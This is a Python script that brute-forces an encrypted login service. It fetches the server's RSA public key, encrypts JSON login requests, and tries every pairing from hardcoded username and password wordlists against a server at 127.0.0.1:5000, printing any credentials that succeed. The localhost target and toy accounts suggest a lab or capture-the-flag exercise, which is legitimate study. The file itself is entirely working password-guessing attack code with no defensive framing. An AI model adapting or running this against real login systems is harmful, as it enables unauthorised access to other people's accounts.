import socket
import json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5000

def get_server_public_key(s):
    data = s.recv(4096)
    server_key = RSA.importKey(data)
    return server_key

def attempt_login(username, password):
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_HOST, SERVER_PORT))
    server_pub = get_server_public_key(s)

    req = {
        "action": "login",
        "username": username,
        "password": password
    }
    plain = json.dumps(req).encode('utf-8')
    cipher = PKCS1_OAEP.new(server_pub)
    enc = cipher.encrypt(plain)
    s.sendall(enc)
    resp = s.recv(4096)
    s.close()
    try:
        resp_json = json.loads(resp.decode('utf-8'))
        if resp_json.get("status") == "Authenticated":
            return True
    except:
        pass
    return False

# wordlists
usernames = ["alice", "bob", "arwa", "irena"]
passwords = ["BobPass456", "1234", "AlicePass123", "letmein"]

for user in usernames:
    for pw in passwords:
        print(f"Trying {user}:{pw}")
        if attempt_login(user, pw):
            print(f"Success! Credentials: {user}:{pw}")
            break
